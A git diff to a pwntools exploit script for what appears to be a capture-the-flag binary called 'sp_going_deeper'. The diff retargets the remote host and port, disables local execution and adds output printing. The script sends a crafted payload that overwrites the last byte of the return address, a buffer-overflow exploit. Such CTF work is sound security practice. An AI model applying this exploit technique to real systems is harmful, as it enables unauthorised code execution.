@@ -13,11 +13,11 @@
 from pwn import *
 from time import sleep
 
-HOST = '209.97.137.220'
-PORT = 31520
+HOST = '94.237.53.113'
+PORT = 54291
 
 context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
-proc = process('./sp_going_deeper')
+#proc = process('./sp_going_deeper')
 proc = remote(HOST, PORT)
 
 proc.sendlineafter(b'>>', b'2')
@@ -31,4 +31,7 @@ payload = b''.join([
   p8(0x12), # overwrite last byte of rip
 ])
 proc.sendlineafter(b'Username: ', payload)
+print(proc.recvline())
+print(proc.recvline())
+print(proc.recvline())
 print(proc.recvline())
